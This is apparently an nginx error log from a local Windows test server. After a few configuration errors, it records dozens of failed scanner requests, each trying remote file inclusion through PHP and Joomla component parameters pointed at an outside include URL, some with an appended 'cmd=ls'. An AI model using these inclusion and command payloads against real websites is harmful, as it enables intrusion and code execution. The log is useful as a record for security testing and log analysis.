2019/04/18 20:22:26 [notice] 7436#6776: signal process started
2019/04/18 20:28:01 [emerg] 12700#6984: "server_tokens" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:4
2019/04/18 20:28:29 [emerg] 12460#11644: "add_header" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:8
2019/04/18 20:28:45 [emerg] 8020#7960: "server" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:3
2019/04/18 20:29:48 [emerg] 9964#4972: "server" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:2
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/index.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/index.php?pg=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/index.php?xtrphome=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/index_sitios.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/index_sitios.php?_VIEW=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/lib_action_step.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/lib_action_step.php?GLOBALS[CLASS_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/login.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/login.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/news.admin.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/news.admin.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/news.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/news.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/plugins/Online_Users/main.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/plugins/Online_Users/main.php?GLOBALS[PT_Config][dir][data]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/sendmsg.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/sendmsg.php?config[installdir]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/setup/level2.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/setup/level2.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/system/config/conf-activation.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/system/config/conf-activation.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/system/include.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/system/include.php?skindir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/system/include.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/system/include.php?start=1&skindir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/system/menu/item.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/system/menu/item.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/system/modules/conf_modules.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/system/modules/conf_modules.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/templates/template_thumbnail.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/templates/template_thumbnail.php?thumb_template=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/testing/tests/0004_init_urls.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/testing/tests/0004_init_urls.php?init_path=http://cirt.net/rfiinc.txt??& HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/themes.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/themes.php?config[installdir]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/tools/utf8con2.1.6/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/tools/utf8con2.1.6/index.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/tools/utf8conversion/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/tools/utf8conversion/index.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/user_user.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/user_user.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admincp/auth/checklogin.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admincp/auth/checklogin.php?cfgProgDir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admincp/auth/secure.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admincp/auth/secure.php?cfgProgDir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/adminhead.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /adminhead.php?path[docroot]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admini/admin.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admini/admin.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admini/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admini/index.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/admin.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/admin.php?site_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_bayesiannaivefilter/lang.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/PPS.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/PPS/File.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/Writer.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/Writer/Format.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/Recly/Clickheat/Cache.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/Recly/common/GlobalVariables.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/includes/heatmap/_main.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/includes/heatmap/main.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/includes/overview/main.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_clickheat/install.clickheat.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_color/admin.color.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_color/admin.color.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_color/admin.color.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_color/admin.color.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_competitions/includes/competitions/add.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_competitions/includes/competitions/competitions.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_competitions/includes/settings/settings.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_cropimage/admin.cropcanvas.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_cropimage/admin.cropcanvas.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_dadamail/config.dadamail.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_dadamail/config.dadamail.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_dbquery/classes/DBQ/admin/common.class.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_dbquery/classes/DBQ/admin/common.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_events/admin.events.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_events/admin.events.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_extcalendar/admin_settings.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_extcalendar/admin_settings.php?CONFIG_EXT[ADMIN_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_extended_registration/admin.extended_registration.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_extended_registration/admin.extended_registration.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_feederator/includes/tmsp/add_tmsp.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_feederator/includes/tmsp/subscription.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_feederator/includes/tmsp/tmsp.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_googlebase/admin.googlebase.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/jcs.function.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/view/add.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/view/history.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/view/register.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/views/list.sub.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/views/list.user.sub.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jcs/views/reports.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jim/install.jim.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jjgallery/admin.jjgallery.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_joom12pic/admin.joom12pic.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
